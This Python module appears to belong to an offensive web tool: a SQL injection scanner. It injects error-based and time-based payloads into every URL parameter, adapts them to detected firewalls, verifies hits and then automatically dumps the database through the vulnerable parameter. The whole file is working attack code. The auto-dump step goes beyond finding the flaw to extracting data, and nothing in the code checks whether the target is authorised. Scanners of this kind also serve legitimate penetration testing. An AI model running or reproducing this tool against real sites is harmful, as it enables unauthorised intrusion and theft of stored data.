"""sqli — SQLi scanner on Probe v2: error + time + boolean, verify, auto-dump"""
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.probe import Probe
from core.payload_source import get_payloads, detect_waf

ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "mysqli", "pg_query", "pg_exec", "sqlite3",
    "ora-", "microsoft ole db", "odbc sql", "postgresql",
    "syntax error at or near", "sqlstate", "unclosed quotation",
    "quoted string not properly terminated", "you have an error in your sql",
    "warning: mysql", "mysql_num_rows", "division by zero",
    "invalid query", "sql command not properly ended", "java.sql.sqlexception",
]


class Sqli:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"id": ["1"]}

        probe = Probe(session, logger)
        base = probe.baseline_probe(target)
        if not base:
            print("[sqli] no baseline"); return {"findings": []}
        print(f"[sqli] baseline: {base['code']} {base['len']}b")
        all_p = get_payloads("sql", waf=detect_waf(session), limit=80)
        error_p = all_p[:60]
        time_p = [x for x in all_p if any(k in x.lower() for k in ("sleep","waitfor","pg_sleep","benchmark"))][:5]

        print(f"[sqli] {len(error_p)} error, {len(time_p)} time payloads")

        findings = []
        vuln_param = None

        for name in params:
            print(f"\n[error-based] {name}")
            for i, p in enumerate(error_p, 1):
                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
                )
                r = probe.inject(url_fn, p, detect_markers=ERROR_MARKERS)
                if not r["hit"] or not r["reason"].startswith("marker:"):
                    if i % 15 == 0: print(f"  · {i}/{len(error_p)}")
                    continue
                verified = probe.verify(url_fn, p, detect_markers=ERROR_MARKERS, times=2)
                if not verified:
                    print(f"  · unverified: {p[:50]}"); continue
                marker = r["reason"].split(":", 1)[1]
                sev = probe.escalate_severity("high", r,
                       r.get("response").text if r.get("response") is not None else "")
                print(f"  ✓ [{sev}] ERROR: {name}={p[:50]} -> {marker}")
                findings.append({"param": name, "payload": p, "type": "error",
                                 "marker": marker, "severity": sev, "verified": True})
                logger.finding("sqli_error", sev, f"{name}={p[:60]} marker={marker}")
                vuln_param = name
                break

            if vuln_param:
                continue

            print(f"\n[time-based] {name}")
            for p in time_p:
                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
                )
                tr = probe.time_probe(url_fn, p, delay_threshold=2.5)
                if tr["hit"]:
                    print(f"  ✓ [{tr['delay']}s] TIME: {p[:50]}")
                    findings.append({"param": name, "payload": p, "type": "time",
                                     "delay": tr["delay"], "severity": "high", "verified": True})
                    logger.finding("sqli_time", "high", f"{name} delay={tr['delay']}")
                    vuln_param = name
                    break

        # auto-dump if vuln found
        if vuln_param:
            print(f"\n[sqli] vulnerable: {vuln_param} — auto-dump")
            probe.auto_dump({"kind": "sqli"}, target, vuln_param)

        print(f"\n[sqli] total: {len(findings)} verified")
        print(f"[sqli] stats: {probe.summary()}")
        return {"vulnerable": bool(findings), "findings": findings,
                "param": vuln_param, "stats": probe.summary()}
